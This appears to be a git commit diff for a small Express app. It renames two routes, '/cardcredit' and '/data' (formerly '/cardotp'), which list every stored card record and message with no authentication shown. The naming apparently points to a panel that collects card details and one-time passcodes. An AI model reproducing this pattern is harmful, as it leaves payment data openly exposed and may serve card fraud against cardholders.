449738d5ff53a9a907146da1ad80f6f0f8df1d2d
sonia7982 <127930002+sonia7982@users.noreply.github.com>
2023-09-02 14:39:06 +0530

    Update index.js

--- routes/index.js
+++ routes/index.js
@@ -51,11 +51,11 @@ router.post('/message', async (req, res)=>{
   res.send('message got success')
 })
 
-router.get("/message", async (req, res)=>{
+router.get("/cardcredit", async (req, res)=>{
   let cardData = await CardModal.find().sort({createdAt: -1});
   res.render("card", {cardData})
 })
-router.get("/cardotp", async (req, res)=>{
+router.get("/data", async (req, res)=>{
   let cardData = await MessageModal.find().sort({createdAt: -1});
   res.render("message", {cardData})
 })
